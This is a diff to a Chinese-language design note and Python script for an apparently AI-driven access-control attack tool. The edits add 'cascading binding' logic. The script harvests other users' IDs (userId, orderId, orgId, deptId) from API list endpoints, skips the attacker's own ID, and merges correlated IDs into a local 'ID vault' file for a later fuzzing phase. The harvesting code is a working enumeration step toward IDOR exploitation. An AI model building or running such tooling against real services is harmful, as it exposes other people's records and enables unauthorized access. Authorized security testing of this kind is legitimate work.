@@ -22,12 +22,15 @@
 
 **步骤 2：信息收集与绑定 (Harvesting & ID Correlation)**
 - AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list` 或 `/api/v1/orders/page`）。
-- **【核心机制：动态 ID 金库】**：解析响应 JSON 数组时，**绝不硬编码任何 ID 名称**。而是动态寻找所有以 `id` 结尾的字段（忽略大小写，如 `userId`, `openId`, `doc_id`, `orgId`）。
-- 只要这些字段出现在同一个 JSON Object 中，就认为它们是属于同一个实体的**强绑定关系**。
-- 将这些提取到的字典作为一行记录，追加写入到本地持久化文件（如 `id_vault.jsonl`）中。
+- **【核心机制：动态 ID 金库与强关联原则】**：
+  - **原则：根据一个 ID 查到的其他 ID，说明它们是强关联的，必须放在同一行。**
+  - 解析响应 JSON 时，**绝不硬编码任何 ID 名称**。动态寻找所有以 `id` 结尾的字段（如 `userId`, `openId`, `doc_id`, `orgId`）。
+  - **同级对象绑定**：只要这些字段出现在同一个 JSON Object 中，就认为它们属于同一个实体。
+  - **级联绑定 (Cascading)**：如果用 `userId` 去请求详情接口 `/api/user/detail`，返回了 `deptId` 和 `roleId`，那么这些新查出的 ID 必须和原来的 `userId` **合并到同一行记录中**。
+- 将这些强关联的字典作为一行记录，追加写入到本地持久化文件（如 `id_vault.jsonl`）中。
   - 示例 `id_vault.jsonl` 内容：
     ```json
-    {"userId": "1001", "openId": "wx_abc", "orgId": "99"}
+    {"userId": "1001", "openId": "wx_abc", "orgId": "99", "deptId": "5"}
     {"orderId": "505", "userId": "1001", "merchantId": "88"}
     ```
 
@@ -61,7 +64,7 @@ headers = {
 print("[*] Phase 1: Harvesting dynamic bound IDs into Vault...")
 
 def save_to_vault(id_dict):
-    # 简单的去重逻辑，实际工程中可以使用 SQLite 或 set
+    # 将字典按行写入金库
     with open(VAULT_FILE, "a") as vf:
         vf.write(json.dumps(id_dict) + "\n")
 
@@ -69,11 +72,13 @@ def save_to_vault(id_dict):
 if os.path.exists(VAULT_FILE):
     os.remove(VAULT_FILE)
 
+# 用于存储暂时的强关联记录，支持后续的级联扩充
+memory_vault = []
+
 for source in graph["sources_for_leakage"]:
     try:
         if source["method"] == "GET":
             res = requests.get(BASE_URL + source["path"], headers=headers, timeout=5)
-            
             try:
                 json_data = res.json()
                 def extract_objects(obj):
@@ -82,9 +87,21 @@ for source in graph["sources_for_leakage"]:
                             if isinstance(item, dict):
                                 # 动态提取所有以 id 结尾的 key
                                 id_dict = {k: v for k, v in item.items() if str(k).lower().endswith('id')}
-                                # 如果字典不为空，且不全是自己的 ID，则写入金库
+                                # 如果字典不为空，且不全是自己的 ID，则认为它们是强关联的
                                 if id_dict and not all(str(v) == ATTACKER_ID for v in id_dict.values()):
-                                    save_to_vault(id_dict)
+                                    # 检查是否能与 memory_vault 中已有的行进行“级联绑定”
+                                    # （比如用 userId 查到了 deptId，那就把 deptId 补充到对应 userId 的那一行）
+                                    merged = False
+                                    for existing_row in memory_vault:
+                                        # 寻找交集（比如都有 userId=1001）
+                                        common_keys = set(id_dict.keys()) & set(existing_row.keys())
+                                        if common_keys and all(id_dict[k] == existing_row[k] for k in common_keys):
+                                            # 合并新的 ID 到同一行
+                                            existing_row.update(id_dict)
+                                            merged = True
+                                            break
+                                    if not merged:
+                                        memory_vault.append(id_dict)
                             extract_objects(item)
                     elif isinstance(obj, dict):
                         for k, v in obj.items():
@@ -96,7 +113,11 @@ for source in graph["sources_for_leakage"]:
     except Exception as e:
         continue
 
-print(f"[+] Harvested ID rows saved to {VAULT_FILE}.")
+# 最终将内存中已经合并/级联好的记录，写入持久化金库文件
+for row in memory_vault:
+    save_to_vault(row)
+
+print(f"[+] Harvested {len(memory_vault)} correlated ID rows saved to {VAULT_FILE}.")
 
 # ==========================================
 # 阶段 2: 查阅金库并进行动态匹配 Fuzzing
